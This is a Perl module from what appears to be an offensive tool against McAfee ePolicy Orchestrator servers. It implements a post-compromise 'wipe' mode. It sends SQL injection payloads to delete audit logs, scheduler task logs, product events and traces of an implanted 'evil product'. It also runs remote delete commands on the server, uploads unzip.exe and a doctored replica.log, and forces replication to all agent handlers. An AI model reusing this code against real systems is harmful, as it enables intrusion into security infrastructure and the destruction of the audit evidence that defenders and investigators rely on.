package Epowner::Epo;

use strict;
use warnings;



# This function calls all other cleaning procedure
sub mode_wipe {

	my $this = shift;	


	# Do we have an admin ?
	if($this->{state_add_admin}){

        	$this->print_info   ("\n[*] Web Admin Account\n");	        
		print "[*] Do you want to remove your web admin account from the database ? ";
		if($this->{state_exec_nondba_setup}){
			print "(you don't need it anymore for Remote Command Exec in NonDBA mode) ";
		}
		print "[Y/n] : ";

		my $doit = <>; chomp($doit);
        	if($doit eq '' or $doit eq 'y' or  $doit eq 'Y'){
	        	$this->mode_addadmin_clean();        
        	}
	}


	# Did we use --cli-deploy ?
	if($this->{state_cli_deploy}) {
		$this->print_info("\n[*] Downgrading replica.log\n");
		$this->mode_wipe_downgrade_replica();

		$this->print_info("\n[*] Cleaning up ePo repository\n");
		$this->mode_wipe_repository();
		#$this->mode_wipe_catalog();	# Sorry I'm tired ... catalog will be automatically updated within 24h...	

		# Wait until the repository is cleaned. Then force replication of the changes
		# Poll replica.log until our evil product name disapears...
		$this->print_info("\n[*] Polling replica.log until our evil product name disapears...\n");
		for(my $i=0 ; $i<50 ; $i++){
        		my $uri = "https://" . $this->{server_host} . ":" . $this->{server_port} . "/Software/Current/replica.log";
        		# Download replica.log
        		my $replica_content = $this->http_poll_uri_get($uri);
        		if($replica_content eq 0){
                		$this->print_err ("[-] ERROR (mode_wipe): Can't download replica.log.\n");
                		return 0;
        		}
			# Does replica.log contains our evil product name ?
			last if($replica_content !~ /$this->{deploy_evil_product_id}/);

			print "          retrying in 10 sec ...\n" ;
                        sleep(10);

		} 

		$this->print_info("\n[*] Cleaning up unzip.exe\n");
	        # delete unzip.exe & repo.zip on the server (uploaded by mode_wipe_downgrade_replica())
        	my $db_folder = $this->{server_db_folder};
		        $this->mode_server_exec_send(
                	"del /F ${db_folder}\\$this->{deploy_remote_zipfile} & "  .
	                "del /F ${db_folder}\\$this->{unzip_remote_file} "
        	);

		# Replicate the changes
		$this->print_info("\n[*] Notifying all ePo servers about the changes\n");
		$this->mode_wipe_replicate();
	}

        # Did we set up RCE in NonDBA mode ?
        if($this->{state_exec_nondba_setup}){

		$this->print_info("\n[*] Remote Code Execution in NonDBA mode\n");
                print "[*] Do you want to delete the Remote Command Exec in NonDBA mode ? (warn: you wont be able to execute further commands) ? [N/y] : ";

                my $doit = <>; chomp($doit);
                if($doit eq 'y' or  $doit eq 'Y'){
                        if($this->mode_server_exec_notdba_clean()){
                                $this->print_ok("[*] It smells good\n");
                        }else{
                                $this->print_err("[-] ERROR: --clean-nondba failure\n");
                        }
                }
        }

	
	# clean up database
	$this->print_info("\n[*] Cleaning up database\n");
	$this->mode_wipe_db();
}



# This function replicate the cleaning changes to all AgentHandlers 
sub mode_wipe_replicate {
	
	my $this = shift;

        my $sqli =
                "') ; " .
                # Notify All handler that catalog has a new version" 
                "exec EPOAgentHandler_NotifyAllServers N'SiteListChanged', N'AgentHandler'; ".
                # Ask mod_eporepo to flush cache 
                "exec EPOAgentHandler_NotifyAllServers N'FlushRepositoryCache', N'mod_eporepo'; " .
                " -- ";

        print "[*] Send Repository replication request\n";
        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
        $this->send_http_request($http_request);	

	return 1;
}



# This function will delete the following folders from the repository 
# - /Software/Current/OUR_EVIL_PRODUCT
# - /RepoCache/Current/OUR_EVIL_PRODUCT
sub mode_wipe_repository {
	
	my $this = shift;
        my $db_folder = $this->{server_db_folder};
        $this->mode_server_exec_send(
                "rmdir /S /Q ${db_folder}\\Software\\Current\\$this->{deploy_evil_product_id} & "  .
                "rmdir /S /Q ${db_folder}\\RepoCache\\Current\\$this->{deploy_evil_product_id} " 
        );
	return 1;
}


# File /Software/Current/replica.log contains the list of all McAfee software present on the repository, branch: "Current"
# We have to remove our evil product from that file 
# In this function, we download the official replica.log file from the repository, update it, then upload the new version on the server
sub mode_wipe_downgrade_replica {

	my $this = shift;
        
	print "[*] Downgrading /Software/Current/replica.log\n";

        my $server_host = $this->{server_host};
        my $server_port = $this->{server_port};
        my $uri = "https://$server_host:$server_port/Software/Current/replica.log";

        # Download replica.log
        my $replica_content = $this->http_poll_uri_get($uri);
        if($replica_content eq 0){
                $this->print_err ("[-] ERROR (mode_clean_downgrade_replica): Can't download replica.log. Software replication will introduce error message in ePo log files. That's life ..\n");
                return 0;
        }

        # Replica.log sample
        #------------------

        # [General]
        # NumItems=12
        # [ITEM_1]
        # Name=EPOAGENT3000
        # Type=Directory
        # Size=0
        # Hash=
        # Hash256=
        # [ITEM_2]
        # ...

        # Does our Evil product name is in that file ? (did we use --cli-deploy ?)
        if($replica_content !~ /$this->{deploy_evil_product_id}/){
                # No additional modification is needed
                return 1;
        }

        # Get "NumItems"
        my $numitems = $1 if $replica_content =~ /.*NumItems=([0-9]+).*/g || -1;
	if($numitems eq -1){
		$this->print_err ("[-] ERROR (mode_clean_downgrade_replica): Can't extract 'NumItems' from replica.log. Abording\n");
		return 0;
	}

	# Read all [ITEM_x], and push them into an array
	# We assume that we don't know the position of the ITEM we want to remove. If not the last one of the list,
	# we must update the item id of the following entries.. So yeah, let's manage it using an array

	# Get position of the first ITEM
	my $first_item_pos = index($replica_content, "[ITEM_1]");
	# remove [General] header
	my $items_content = substr($replica_content, $first_item_pos); # string containing only the ITEM_x list
	my @items_array = split(/\[ITEM_[0-9]+\]\r\n/, $items_content);
	shift @items_array; # Drop the first entry (empty string)

	# rebuild a new replica.log
	my $count =0;
	my $replica_content_new = '';	
	foreach my $item (@items_array) {
		# ignore our own product name
		if ($item !~ /$this->{deploy_evil_product_id}/){
			$count++;
			$replica_content_new .=
				"[ITEM_$count]\r\n" .
				$item;
		}
	}

	# Add header
	$replica_content_new = 
		"[General]\r\n" .
		"NumItems=$count\r\n" .
		$replica_content_new;


	# OK, replica.log is done.

	# Time to upload the file on the server
	# Unfortunately we can't use ModeServerUpload here as the destination filename (path included) is longer than 26 chars (Software/Current/replica.log)
	# So, we will create a ZIp file, upload it, and decrompress it on the server :-/


        # if previous repo exists, drop everything
        if (-d $this->{deploy_local_repository}){
                print "      [+] Cleaning up previous repo\n" if $this->{verbose};
                rmtree($this->{deploy_local_repository});
        }

        my $software_folder =   $this->{deploy_local_repository} .
                                "Software/" .
                                "Current/" ;
        my $repocache_folder =   $this->{deploy_local_repository} .
                                "RepoCache/" .
                                "Current/" ;

        # create local folders
        mkpath($software_folder);
        if(not -d $software_folder){
                $this->print_err ("[-] ERROR (mode_clean_downgrade_replica): can't create directory path $software_folder\n");
                exit;
        }
        mkpath($repocache_folder);
        if(not -d $repocache_folder){
                $this->print_err ("[-] ERROR (mode_clean_downgrade_replica): can't create directory path $repocache_folder\n");
                exit;
        }

        # Save replica.log
       	open FILE, ">$software_folder/replica.log" or die "[-] ERROR: can't write to $software_folder/replica.log\n";
       	print FILE $replica_content_new ;
       	close FILE;
	open FILE, ">$repocache_folder/replica.log" or die "[-] ERROR: can't write to $repocache_folder/replica.log\n";
        print FILE $replica_content_new ;
        close FILE;



        # zip repository
        #============================
        print "[*] Compressing new replica.log to 'repo.zip'\n";
        $this->compress_zip_tree( $this->{deploy_local_repository},     # folder to zip
                                  $this->{deploy_local_zipfile}         # zip filename
        );

        # upload zipped repo file to ePo server
        #======================================
        $this->mode_server_upload_from_file( $this->{deploy_local_zipfile},     # source filename
                                 	 $this->{deploy_remote_zipfile}         # dest filename
        );

        # Upload "unzip.exe" :)
        #============================
        $this->mode_server_upload_from_file( $this->{unzip_local_file},         # source filename
                                 	     $this->{unzip_remote_file}         # dest filename
        );


        # Ask server to uncompress our repository (and so, update the main repo)
        #=======================================================================
        print "[*] Unzip replica.log on server side\n" if $this->{verbose};
        my $repo  = $this->{deploy_remote_zipfile};
        my $unzip = $this->{unzip_remote_file};
        $repo =~ s/\.\.|\///g;  # remove /../../
        $unzip =~ s/\.\.|\///g; # remove /../../


        # do we already know the installation path of ePo ?
        my $db_path ;
        if(length($this->{server_db_folder}) ne 0){
                $db_path = $this->{server_db_folder}   ;
        }else{
                $db_path = $this->{server_db_folder_default} ;
                $this->print_warn ("[-] WARNING: epo installation path is unknowm. Assuming default value!\n");
                $this->print_warn ("             You may want to use '--get-install-path' to fix this.\n");
        }

        # exec cmd: call unzip.exe
        $this->mode_server_exec_send(
                        "\"\"" . $db_path . "\\" .$unzip. "\" " .               # unzip.exe
                        "-o \"" . $db_path . "\\" . $repo . "\" " .             # -o repo.zip
                        "-d \"" . $db_path . "\"\""                             # -d dest folder
        );

    #    # delete unzip.exe & repo.zip on the server
    #    my $db_folder = $this->{server_db_folder};
    #    $this->mode_server_exec_send(
    #            "del /F ${db_folder}\\$this->{deploy_remote_zipfile} & "  .
    #            "del /F ${db_folder}\\$this->{unzip_remote_file} "
    #    );

	return 1;

}



sub mode_wipe_nondba_cmd_history {

        my $this = shift;


	if($this->{srv_exec_mode} != 2 and not $this->{server_force_nondba}){

		$this->print_warn("[-] ERROR: --clean-cmd-history is only needed for NonDBA Remote Code Exec\n");
		$this->print_warn("           Skipping user request\n");
		exit;
	}

        # SQL Injection
        my $sqli =
                "') ; " .

                # Events sent by us, or victims
                "delete from EPOProductEvents where AgentGUID = '$this->{agent_guid}' ; " .
		" -- ";


        print "[*] Cleaning up cmd history ...\n";

        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
        if($this->send_http_request($http_request)){
		return 1;
        }else{
                return 0;
        }

}


sub mode_wipe_db {

	my $this = shift;

	# SQL Injection
	my $sqli =
                "') ; " .
		# MasterCatalog is modified by the catalog.z file that we upload (--upload)
		"delete from EPOMasterCatalog where ProductCode = '" . $this->{deploy_evil_product_id} . "'; " .
#"\n".
		# Orion (tomcat) logs 
		"delete from OrionAuditLog where UserName = '" . $this->{admin_username} . "'; " .
		"delete from OrionAuditLog where Message like '%" . $this->{agent_hostname} . "%'; " .
		"delete from OrionAuditLog where Message like '%" . $this->{common_prefix} . "%'; " .
#"\n".
		# Task logs introduced by "--exec-server --cmd" in NON-DBA mode	, and by logged-in attacker	
		"declare \@TempTblLog Table (id int); " .
		"insert into \@TempTblLog Select id from OrionSchedulerTaskLog where Name like '" . $this->{common_prefix} .  "%'; " .
		"delete from OrionSchedulerTaskLog where ParentId in (select id from \@TempTblLog) or Id in (select id from \@TempTblLog); " .
		"delete from \@TempTblLog;" .
		"insert into \@TempTblLog Select id from OrionSchedulerTaskLog where UserName = '" . $this->{admin_username} . "'; " .
		"delete from OrionSchedulerTaskLogDetail where TaskLogId in (select id from \@TempTblLog) ; " . 
		"delete from OrionSchedulerTaskLog where UserName = '" . $this->{admin_username} . "'; " .
#"\n".		
		# Sequence number error if any ..
		"delete from EPOAgentSequenceErrorLog where NodeName = '" . $this->{agent_hostname} . "'; " .
#"\n".
		# Events sent by us, or victims
		"delete from EPOProductEvents where AgentGUID = '$this->{agent_guid}' or ProductCode = '$this->{deploy_evil_product_id}'; " .
#"\n".
		# Schedules / Slots
		"declare \@TempTblSched Table (id int); " .
		"insert into \@TempTblSched Select TaskScheduleId from EPOTaskSchedules where Name = '" . $this->{common_prefix} .  "';" .
		"delete from EPOTaskSchedules where TaskScheduleId in (select id from \@TempTblSched) ; " .
		"delete from EPOTaskScheduleSettings where TaskScheduleId in (select id from \@TempTblSched) ; " .
		"delete from EPOTaskSlots where TaskSlotId in (select id from \@TempTblSched) ; " .
#"\n".
		# Tasks ...
		"declare \@TempTblTask Table (id int); " .
		"insert into \@TempTblTask Select TaskObjectId from EPOTaskObjects where Name like '" . $this->{common_prefix} .  "%';" .
		"delete from EPOTaskObjects where TaskObjectId in (select id from \@TempTblTask) ; " .
		"delete from EPOTaskObjectSettings where TaskObjectId in (select id from \@TempTblTask) ; " .
		"delete from EPOTaskObjectUserRoles where TaskObjectId in (select id from \@TempTblTask) ; " .	
		"delete from EPOTaskAssignments where TaskObjectId in (select id from \@TempTblTask) ; " .	
#"\n".
		# Tags ...
		"declare \@TempTblTag Table (id int); " .
		"insert into \@TempTblTag Select TagID from EPOTag where Name like '" . $this->{common_prefix} .  "%';" .
		"delete from EPOTag where TagID in (select id from \@TempTblTag) ; " .
		"delete from EPOTagAssignment where TagID in (select id from \@TempTblTag) ;" .
		"delete from EPOTaskAssignmentsTags where TagId in (select id from \@TempTblTag) ;" .
#"\n".
		" -- ";
#print $sqli ;
#exit;

	print "[*] Cleaning up 15 database tables ...\n";

        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
        if($this->send_http_request($http_request)){


        }else{
                return 0;
        }

	return 1;

}
1;
